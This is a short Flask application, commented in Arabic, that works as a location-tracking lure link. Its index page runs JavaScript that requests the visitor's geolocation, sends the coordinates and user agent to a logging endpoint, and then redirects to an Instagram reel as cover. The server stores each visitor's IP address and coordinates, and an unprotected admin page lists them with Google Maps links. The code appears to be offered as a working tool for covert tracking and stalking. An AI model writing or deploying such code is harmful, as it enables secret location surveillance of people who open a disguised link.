from flask import Flask, request, redirect

app = Flask(__name__)

# قائمة لتخزين البيانات
visitors = []

TARGET_URL = "https://www.instagram.com/reel/DW1uB4LjM8N/"

@app.route('/')
def index():
    # كود JavaScript لطلب الموقع والتحويل
    return f"""
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                var lat = position.coords.latitude;
                var lon = position.coords.longitude;
                fetch('/log-location?lat=' + lat + '&lon=' + lon + '&ua=' + encodeURIComponent(navigator.userAgent));
                window.location.href = '{TARGET_URL}';
            }, function() {{ window.location.href = '{TARGET_URL}'; }});
        } else {{ window.location.href = '{TARGET_URL}'; }}
    </script>
    """

@app.route('/log-location')
def log_location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    ua = request.args.get('ua')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # إضافة البيانات للقائمة
    visitors.append({
        "ip": ip,
        "lat": lat,
        "lon": lon,
        "ua": ua
    })
    return "OK"

@app.route('/admin')
def admin():
    if not visitors:
        return "<h1>لا توجد بيانات بعد. حاول فتح الرابط من جوالك واضغط 'سماح'</h1>"
    
    html = "<h1>بيانات الزوار</h1><table border='1'><tr><th>IP</th><th>Google Maps</th></tr>"
    for v in visitors:
        # رابط مباشر لخرائط جوجل باستخدام الإحداثيات
        map_link = f"https://www.google.com/maps?q={v['lat']},{v['lon']}"
        html += f"<tr><td>{v['ip']}</td><td><a href='{map_link}' target='_blank'>شاهد الموقع على الخريطة</a></td></tr>"
    html += "</table>"
    return html

if __name__ == '__main__':
    app.run()
